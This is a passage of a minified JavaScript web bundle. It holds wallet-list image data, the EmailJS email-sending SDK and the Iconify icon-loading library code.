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",
    },
    {
      name: "Phantom Wallet",
      icon: "data:image/png;base64,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",
    },
  ],
  Ls = "/assets/logo-CazK_bcb.png",
  eh = "/assets/blur-ChQC1Rtp.png";
class ar {
  constructor(t = 0, n = "Network Error") {
    (this.status = t), (this.text = n);
  }
}
const th = () => {
    if (!(typeof localStorage > "u"))
      return {
        get: (e) => Promise.resolve(localStorage.getItem(e)),
        set: (e, t) => Promise.resolve(localStorage.setItem(e, t)),
        remove: (e) => Promise.resolve(localStorage.removeItem(e)),
      };
  },
  ee = {
    origin: "https://api.emailjs.com",
    blockHeadless: !1,
    storageProvider: th(),
  },
  uu = (e) =>
    e
      ? typeof e == "string"
        ? { publicKey: e }
        : e.toString() === "[object Object]"
        ? e
        : {}
      : {},
  nh = (e, t = "https://api.emailjs.com") => {
    if (!e) return;
    const n = uu(e);
    (ee.publicKey = n.publicKey),
      (ee.blockHeadless = n.blockHeadless),
      (ee.storageProvider = n.storageProvider),
      (ee.blockList = n.blockList),
      (ee.limitRate = n.limitRate),
      (ee.origin = n.origin || t);
  },
  pf = async (e, t, n = {}) => {
    const r = await fetch(ee.origin + e, {
        method: "POST",
        headers: n,
        body: t,
      }),
      l = await r.text(),
      i = new ar(r.status, l);
    if (r.ok) return i;
    throw i;
  },
  Af = (e, t, n) => {
    if (!e || typeof e != "string")
      throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account";
    if (!t || typeof t != "string")
      throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
    if (!n || typeof n != "string")
      throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates";
  },
  rh = (e) => {
    if (e && e.toString() !== "[object Object]")
      throw "The template params have to be the object. Visit https://www.emailjs.com/docs/sdk/send/";
  },
  hf = (e) => e.webdriver || !e.languages || e.languages.length === 0,
  mf = () => new ar(451, "Unavailable For Headless Browser"),
  lh = (e, t) => {
    if (!Array.isArray(e)) throw "The BlockList list has to be an array";
    if (typeof t != "string")
      throw "The BlockList watchVariable has to be a string";
  },
  ih = (e) => {
    var t;
    return !((t = e.list) != null && t.length) || !e.watchVariable;
  },
  oh = (e, t) => (e instanceof FormData ? e.get(t) : e[t]),
  gf = (e, t) => {
    if (ih(e)) return !1;
    lh(e.list, e.watchVariable);
    const n = oh(t, e.watchVariable);
    return typeof n != "string" ? !1 : e.list.includes(n);
  },
  vf = () => new ar(403, "Forbidden"),
  uh = (e, t) => {
    if (typeof e != "number" || e < 0)
      throw "The LimitRate throttle has to be a positive number";
    if (t && typeof t != "string")
      throw "The LimitRate ID has to be a non-empty string";
  },
  sh = async (e, t, n) => {
    const r = Number((await n.get(e)) || 0);
    return t - Date.now() + r;
  },
  yf = async (e, t, n) => {
    if (!t.throttle || !n) return !1;
    uh(t.throttle, t.id);
    const r = t.id || e;
    return (await sh(r, t.throttle, n)) > 0
      ? !0
      : (await n.set(r, Date.now().toString()), !1);
  },
  wf = () => new ar(429, "Too Many Requests"),
  ah = async (e, t, n, r) => {
    const l = uu(r),
      i = l.publicKey || ee.publicKey,
      o = l.blockHeadless || ee.blockHeadless,
      u = l.storageProvider || ee.storageProvider,
      s = { ...ee.blockList, ...l.blockList },
      a = { ...ee.limitRate, ...l.limitRate };
    return o && hf(navigator)
      ? Promise.reject(mf())
      : (Af(i, e, t),
        rh(n),
        n && gf(s, n)
          ? Promise.reject(vf())
          : (await yf(location.pathname, a, u))
          ? Promise.reject(wf())
          : pf(
              "/api/v1.0/email/send",
              JSON.stringify({
                lib_version: "4.4.1",
                user_id: i,
                service_id: e,
                template_id: t,
                template_params: n,
              }),
              { "Content-type": "application/json" }
            ));
  },
  ch = (e) => {
    if (!e || e.nodeName !== "FORM")
      throw "The 3rd parameter is expected to be the HTML form element or the style selector of the form";
  },
  fh = (e) => (typeof e == "string" ? document.querySelector(e) : e),
  dh = async (e, t, n, r) => {
    const l = uu(r),
      i = l.publicKey || ee.publicKey,
      o = l.blockHeadless || ee.blockHeadless,
      u = ee.storageProvider || l.storageProvider,
      s = { ...ee.blockList, ...l.blockList },
      a = { ...ee.limitRate, ...l.limitRate };
    if (o && hf(navigator)) return Promise.reject(mf());
    const p = fh(n);
    Af(i, e, t), ch(p);
    const d = new FormData(p);
    return gf(s, d)
      ? Promise.reject(vf())
      : (await yf(location.pathname, a, u))
      ? Promise.reject(wf())
      : (d.append("lib_version", "4.4.1"),
        d.append("service_id", e),
        d.append("template_id", t),
        d.append("user_id", i),
        pf("/api/v1.0/email/send-form", d));
  },
  Us = { init: nh, send: ah, sendForm: dh, EmailJSResponseStatus: ar },
  Sf = Object.freeze({ left: 0, top: 0, width: 16, height: 16 }),
  hl = Object.freeze({ rotate: 0, vFlip: !1, hFlip: !1 }),
  su = Object.freeze({ ...Sf, ...hl }),
  uo = Object.freeze({ ...su, body: "", hidden: !1 });
function ph(e, t) {
  const n = {};
  !e.hFlip != !t.hFlip && (n.hFlip = !0),
    !e.vFlip != !t.vFlip && (n.vFlip = !0);
  const r = ((e.rotate || 0) + (t.rotate || 0)) % 4;
  return r && (n.rotate = r), n;
}
function Is(e, t) {
  const n = ph(e, t);
  for (const r in uo)
    r in hl
      ? r in e && !(r in n) && (n[r] = hl[r])
      : r in t
      ? (n[r] = t[r])
      : r in e && (n[r] = e[r]);
  return n;
}
function Ah(e, t) {
  const n = e.icons,
    r = e.aliases || Object.create(null),
    l = Object.create(null);
  function i(o) {
    if (n[o]) return (l[o] = []);
    if (!(o in l)) {
      l[o] = null;
      const u = r[o] && r[o].parent,
        s = u && i(u);
      s && (l[o] = [u].concat(s));
    }
    return l[o];
  }
  return Object.keys(n).concat(Object.keys(r)).forEach(i), l;
}
function hh(e, t, n) {
  const r = e.icons,
    l = e.aliases || Object.create(null);
  let i = {};
  function o(u) {
    i = Is(r[u] || l[u], i);
  }
  return o(t), n.forEach(o), Is(e, i);
}
function xf(e, t) {
  const n = [];
  if (typeof e != "object" || typeof e.icons != "object") return n;
  e.not_found instanceof Array &&
    e.not_found.forEach((l) => {
      t(l, null), n.push(l);
    });
  const r = Ah(e);
  for (const l in r) {
    const i = r[l];
    i && (t(l, hh(e, l, i)), n.push(l));
  }
  return n;
}
const mh = { provider: "", aliases: {}, not_found: {}, ...Sf };
function fi(e, t) {
  for (const n in t) if (n in e && typeof e[n] != typeof t[n]) return !1;
  return !0;
}
function Ef(e) {
  if (typeof e != "object" || e === null) return null;
  const t = e;
  if (
    typeof t.prefix != "string" ||
    !e.icons ||
    typeof e.icons != "object" ||
    !fi(e, mh)
  )
    return null;
  const n = t.icons;
  for (const l in n) {
    const i = n[l];
    if (!l || typeof i.body != "string" || !fi(i, uo)) return null;
  }
  const r = t.aliases || Object.create(null);
  for (const l in r) {
    const i = r[l],
      o = i.parent;
    if (!l || typeof o != "string" || (!n[o] && !r[o]) || !fi(i, uo))
      return null;
  }
  return t;
}
const kf = /^[a-z0-9]+(-[a-z0-9]+)*$/,
  Ol = (e, t, n, r = "") => {
    const l = e.split(":");
    if (e.slice(0, 1) === "@") {
      if (l.length < 2 || l.length > 3) return null;
      r = l.shift().slice(1);
    }
    if (l.length > 3 || !l.length) return null;
    if (l.length > 1) {
      const u = l.pop(),
        s = l.pop(),
        a = { provider: l.length > 0 ? l[0] : r, prefix: s, name: u };
      return t && !Dr(a) ? null : a;
    }
    const i = l[0],
      o = i.split("-");
    if (o.length > 1) {
      const u = { provider: r, prefix: o.shift(), name: o.join("-") };
      return t && !Dr(u) ? null : u;
    }
    if (n && r === "") {
      const u = { provider: r, prefix: "", name: i };
      return t && !Dr(u, n) ? null : u;
    }
    return null;
  },
  Dr = (e, t) => (e ? !!(((t && e.prefix === "") || e.prefix) && e.name) : !1),
  zs = Object.create(null);
function gh(e, t) {
  return {
    provider: e,
    prefix: t,
    icons: Object.create(null),
    missing: new Set(),
  };
}
function cn(e, t) {
  const n = zs[e] || (zs[e] = Object.create(null));
  return n[t] || (n[t] = gh(e, t));
}
function Cf(e, t) {
  return Ef(t)
    ? xf(t, (n, r) => {
        r ? (e.icons[n] = r) : e.missing.add(n);
      })
    : [];
}
function vh(e, t, n) {
  try {
    if (typeof n.body == "string") return (e.icons[t] = { ...n }), !0;
  } catch {}
  return !1;
}
let rr = !1;
function Pf(e) {
  return typeof e == "boolean" && (rr = e), rr;
}
function Rs(e) {
  const t = typeof e == "string" ? Ol(e, !0, rr) : e;
  if (t) {
    const n = cn(t.provider, t.prefix),
      r = t.name;
    return n.icons[r] || (n.missing.has(r) ? null : void 0);
  }
}
function yh(e, t) {
  const n = Ol(e, !0, rr);
  if (!n) return !1;
  const r = cn(n.provider, n.prefix);
  return t ? vh(r, n.name, t) : (r.missing.add(n.name), !0);
}
function wh(e, t) {
  if (typeof e != "object") return !1;
  if ((typeof t != "string" && (t = e.provider || ""), rr && !t && !e.prefix)) {
    let l = !1;
    return (
      Ef(e) &&
        ((e.prefix = ""),
        xf(e, (i, o) => {
          yh(i, o) && (l = !0);
        })),
      l
    );
  }
  const n = e.prefix;
  if (!Dr({ prefix: n, name: "a" })) return !1;
  const r = cn(t, n);
  return !!Cf(r, e);
}
const Nf = Object.freeze({ width: null, height: null }),
  jf = Object.freeze({ ...Nf, ...hl }),
  Sh = /(-?[0-9.]*[0-9]+[0-9.]*)/g,
  xh = /^-?[0-9.]*[0-9]+[0-9.]*$/g;
function Os(e, t, n) {
  if (t === 1) return e;
  if (((n = n || 100), typeof e == "number")) return Math.ceil(e * t * n) / n;
  if (typeof e != "string") return e;
  const r = e.split(Sh);
  if (r === null || !r.length) return e;
  const l = [];
  let i = r.shift(),
    o = xh.test(i);
  for (;;) {
    if (o) {
      const u = parseFloat(i);
      isNaN(u) ? l.push(i) : l.push(Math.ceil(u * t * n) / n);
    } else l.push(i);
    if (((i = r.shift()), i === void 0)) return l.join("");
    o = !o;
  }
}
function Eh(e, t = "defs") {
  let n = "";
  const r = e.indexOf("<" + t);
  for (; r >= 0; ) {
    const l = e.indexOf(">", r),
      i = e.indexOf("</" + t);
    if (l === -1 || i === -1) break;
    const o = e.indexOf(">", i);
    if (o === -1) break;
    (n += e.slice(l + 1, i).trim()),
      (e = e.slice(0, r).trim() + e.slice(o + 1));
  }
  return { defs: n, content: e };
}
function kh(e, t) {
  return e ? "<defs>" + e + "</defs>" + t : t;
}
function Ch(e, t, n) {
  const r = Eh(e);
  return kh(r.defs, t + r.content + n);
}
const Ph = (e) => e === "unset" || e === "undefined" || e === "none";
function Nh(e, t) {
  const n = { ...su, ...e },
    r = { ...jf, ...t },
    l = { left: n.left, top: n.top, width: n.width, height: n.height };
  let i = n.body;
  [n, r].forEach((w) => {
    const S = [],
      f = w.hFlip,
      c = w.vFlip;
    let A = w.rotate;
    f
      ? c
        ? (A += 2)
        : (S.push(
            "translate(" +
              (l.width + l.left).toString() +
              " " +
              (0 - l.top).toString() +
              ")"
          ),
          S.push("scale(-1 1)"),
          (l.top = l.left = 0))
      : c &&
        (S.push(
          "translate(" +
            (0 - l.left).toString() +
            " " +
            (l.height + l.top).toString() +
            ")"
        ),
        S.push("scale(1 -1)"),
        (l.top = l.left = 0));
    let y;
    switch ((A < 0 && (A -= Math.floor(A / 4) * 4), (A = A % 4), A)) {
      case 1:
        (y = l.height / 2 + l.top),
          S.unshift("rotate(90 " + y.toString() + " " + y.toString() + ")");
        break;
      case 2:
        S.unshift(
          "rotate(180 " +
            (l.width / 2 + l.left).toString() +
            " " +
            (l.height / 2 + l.top).toString() +
            ")"
        );
        break;
      case 3:
        (y = l.width / 2 + l.left),
          S.unshift("rotate(-90 " + y.toString() + " " + y.toString() + ")");
        break;
    }
    A % 2 === 1 &&
      (l.left !== l.top && ((y = l.left), (l.left = l.top), (l.top = y)),
      l.width !== l.height &&
        ((y = l.width), (l.width = l.height), (l.height = y))),
      S.length && (i = Ch(i, '<g transform="' + S.join(" ") + '">', "</g>"));
  });
  const o = r.width,
    u = r.height,
    s = l.width,
    a = l.height;
  let p, d;
  o === null
    ? ((d = u === null ? "1em" : u === "auto" ? a : u), (p = Os(d, s / a)))
    : ((p = o === "auto" ? s : o),
      (d = u === null ? Os(p, a / s) : u === "auto" ? a : u));
  const h = {},
    g = (w, S) => {
      Ph(S) || (h[w] = S.toString());
    };
  g("width", p), g("height", d);
  const v = [l.left, l.top, s, a];
  return (h.viewBox = v.join(" ")), { attributes: h, viewBox: v, body: i };
}
const jh = /\sid="(\S+)"/g,
  Th =
    "IconifyId" +
    Date.now().toString(16) +
    ((Math.random() * 16777216) | 0).toString(16);
let Lh = 0;
function Uh(e, t = Th) {
  const n = [];
  let r;
  for (; (r = jh.exec(e)); ) n.push(r[1]);
  if (!n.length) return e;
  const l = "suffix" + ((Math.random() * 16777216) | Date.now()).toString(16);
  return (
    n.forEach((i) => {
      const o = typeof t == "function" ? t(i) : t + (Lh++).toString(),
        u = i.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      e = e.replace(
        new RegExp('([#;"])(' + u + ')([")]|\\.[a-z])', "g"),
        "$1" + o + l + "$3"
      );
    }),
    (e = e.replace(new RegExp(l, "g"), "")),
    e
  );
}
const so = Object.create(null);
function Ih(e, t) {
  so[e] = t;
}
function ao(e) {
  return so[e] || so[""];
}
function au(e) {
  let t;
  if (typeof e.resources == "string") t = [e.resources];
  else if (((t = e.resources), !(t instanceof Array) || !t.length)) return null;
  return {
    resources: t,
    path: e.path || "/",
    maxURL: e.maxURL || 500,
    rotate: e.rotate || 750,
    timeout: e.timeout || 5e3,
    random: e.random === !0,
    index: e.index || 0,
    dataAfterTimeout: e.dataAfterTimeout !== !1,
  };
}
const cu = Object.create(null),
  kn = ["https://api.simplesvg.com", "https://api.unisvg.com"],
  Kr = [];
for (; kn.length > 0; )
  kn.length === 1 || Math.random() > 0.5
    ? Kr.push(kn.shift())
    : Kr.push(kn.pop());
cu[""] = au({ resources: ["https://api.iconify.design"].concat(Kr) });
function zh(e, t) {
  const n = au(t);
  return n === null ? !1 : ((cu[e] = n), !0);
}
function fu(e) {
  return cu[e];
}
const Rh = () => {
  let e;
  try {
    if (((e = fetch), typeof e == "function")) return e;
  } catch {}
};
let Ms = Rh();
function Oh(e, t) {
  const n = fu(e);
  if (!n) return 0;
  let r;
  if (!n.maxURL) r = 0;
  else {
    let l = 0;
    n.resources.forEach((o) => {
      l = Math.max(l, o.length);
    });
    const i = t + ".json?icons=";
    r = n.maxURL - l - n.path.length - i.length;
  }
  return r;
}
function Mh(e) {
  return e === 404;
}
const Fh = (e, t, n) => {
  const r = [],
    l = Oh(e, t),
    i = "icons";
  let o = { type: i, provider: e, prefix: t, icons: [] },
    u = 0;
  return (
    n.forEach((s, a) => {
      (u += s.length + 1),
        u >= l &&
          a > 0 &&
          (r.push(o),
          (o = { type: i, provider: e, prefix: t, icons: [] }),
          (u = s.length)),
        o.icons.push(s);
    }),
    r.push(o),
    r
  );
};
function Bh(e) {
  if (typeof e == "string") {
    const t = fu(e);
    if (t) return t.path;
  }
  return "/";
}
const Vh = (e, t, n) => {
    if (!Ms) {
      n("abort", 424);
      return;
    }
    let r = Bh(t.provider);
    switch (t.type) {
      case "icons": {
        const i = t.prefix,
          u = t.icons.join(","),
          s = new URLSearchParams({ icons: u });
        r += i + ".json?" + s.toString();
        break;
      }
      case "custom": {
        const i = t.uri;
        r += i.slice(0, 1) === "/" ? i.slice(1) : i;
        break;
      }
      default:
        n("abort", 400);
        return;
    }
    let l = 503;
    Ms(e + r)
      .then((i) => {
        const o = i.status;
        if (o !== 200) {
          setTimeout(() => {
            n(Mh(o) ? "abort" : "next", o);
          });
          return;
        }
        return (l = 501), i.json();
      })
      .then((i) => {
        if (typeof i != "object" || i === null) {
          setTimeout(() => {
            i === 404 ? n("abort", i) : n("next", l);
          });
          return;
        }
        setTimeout(() => {
          n("success", i);
        });
      })
      .catch(() => {
        n("next", l);
      });
  },
  Qh = { prepare: Fh, send: Vh };
function Dh(e) {
  const t = { loaded: [], missing: [], pending: [] },
    n = Object.create(null);
  e.sort((l, i) =>
    l.provider !== i.provider
      ? l.provider.localeCompare(i.provider)
      : l.prefix !== i.prefix
      ? l.prefix.localeCompare(i.prefix)
      : l.name.localeCompare(i.name)
  );
  let r = { provider: "", prefix: "", name: "" };
  return (
    e.forEach((l) => {
      if (
        r.name === l.name &&
        r.prefix === l.prefix &&
        r.provider === l.provider
      )
        return;
      r = l;
      const i = l.provider,
        o = l.prefix,
        u = l.name,
        s = n[i] || (n[i] = Object.create(null)),
        a = s[o] || (s[o] = cn(i, o));
      let p;
      u in a.icons
        ? (p = t.loaded)
        : o === "" || a.missing.has(u)
        ? (p = t.missing)
        : (p = t.pending);
      const d = { provider: i, prefix: o, name: u };
      p.push(d);
    }),
    t
  );
}
function Tf(e, t) {
  e.forEach((n) => {
    const r = n.loaderCallbacks;
    r && (n.loaderCallbacks = r.filter((l) => l.id !== t));
  });
}
function Kh(e) {
  e.pendingCallbacksFlag ||
    ((e.pendingCallbacksFlag = !0),
    setTimeout(() => {
      e.pendingCallbacksFlag = !1;
      const t = e.loaderCallbacks ? e.loaderCallbacks.slice(0) : [];
      if (!t.length) return;
      let n = !1;
      const r = e.provider,
        l = e.prefix;
      t.forEach((i) => {
        const o = i.icons,
          u = o.pending.length;
        (o.pending = o.pending.filter((s) => {
          if (s.prefix !== l) return !0;
          const a = s.name;
          if (e.icons[a]) o.loaded.push({ provider: r, prefix: l, name: a });
          else if (e.missing.has(a))
            o.missing.push({ provider: r, prefix: l, name: a });
          else return (n = !0), !0;
          return !1;
        })),
          o.pending.length !== u &&
            (n || Tf([e], i.id),
            i.callback(
              o.loaded.slice(0),
              o.missing.slice(0),
              o.pending.slice(0),
              i.abort
            ));
      });
    }));
}
let Wh = 0;
function Xh(e, t, n) {
  const r = Wh++,
    l = Tf.bind(null, n, r);
  if (!t.pending.length) return l;
  const i = { id: r, icons: t, callback: e, abort: l };
  return (
    n.forEach((o) => {
      (o.loaderCallbacks || (o.loaderCallbacks = [])).push(i);
    }),
    l
  );
}
function Hh(e, t = !0, n = !1) {
  const r = [];
  return (
    e.forEach((l) => {
      const i = typeof l == "string" ? Ol(l, t, n) : l;
      i && r.push(i);
    }),
    r
  );
}
var Jh = {
  resources: [],
  index: 0,
  timeout: 2e3,
  rotate: 750,
  random: !1,
  dataAfterTimeout: !1,
};
function Gh(e, t, n, r) {
  const l = e.resources.length,
    i = e.random ? Math.floor(Math.random() * l) : e.index;
  let o;
  if (e.random) {
    let E = e.resources.slice(0);
    for (o = []; E.length > 1; ) {
      const C = Math.floor(Math.random() * E.length);
      o.push(E[C]), (E = E.slice(0, C).concat(E.slice(C + 1)));
    }
    o = o.concat(E);
  } else o = e.resources.slice(i).concat(e.resources.slice(0, i));
  const u = Date.now();
  let s = "pending",
    a = 0,
    p,
    d = null,
    h = [],
    g = [];
  typeof r == "function" && g.push(r);
  function v() {
    d && (clearTimeout(d), (d = null));
  }
  function w() {
    s === "pending" && (s = "aborted"),
      v(),
      h.forEach((E) => {
        E.status === "pending" && (E.status = "aborted");
      }),
      (h = []);
  }
  function S(E, C) {
    C && (g = []), typeof E == "function" && g.push(E);
  }
  function f() {
    return {
      startTime: u,
      payload: t,
      status: s,
      queriesSent: a,
      queriesPending: h.length,
      subscribe: S,
      abort: w,
    };
  }
  function c() {
    (s = "failed"),
      g.forEach((E) => {
        E(void 0, p);
      });
  }
  function A() {
    h.forEach((E) => {
      E.status === "pending" && (E.status = "aborted");
    }),
      (h = []);
  }
  function y(E, C, T) {
    const M = C !== "success";
    switch (((h = h.filter((L) => L !== E)), s)) {
      case "pending":
        break;
      case "failed":
        if (M || !e.dataAfterTimeout) return;
        break;
      default:
        return;
    }
    if (C === "abort") {
      (p = T), c();
      return;
    }
    if (M) {
      (p = T), h.length || (o.length ? k() : c());
      return;
    }
    if ((v(), A(), !e.random)) {
      const L = e.resources.indexOf(E.resource);
